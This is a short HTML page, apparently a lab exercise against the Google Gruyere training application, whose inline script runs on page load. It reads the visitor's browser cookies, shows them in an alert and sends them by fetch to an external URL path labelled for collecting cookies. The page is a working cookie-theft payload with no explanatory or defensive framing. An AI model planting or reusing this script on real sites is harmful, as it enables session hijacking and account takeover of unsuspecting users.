<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>
        const cookies = document.cookie;
        alert(cookies);

        fetch(`https://google-gruyere.appspot.com/490155408949636436354343676311084513217/Jojete/hackeo2.html/cookies?cookies=${cookies}`, { 
            method: 'GET',  
        })
        .then(response => response.text())
        .then(data => {
            console.log('Respuesta del servidor:', data);  
        })
    </script>
</body>
</html>
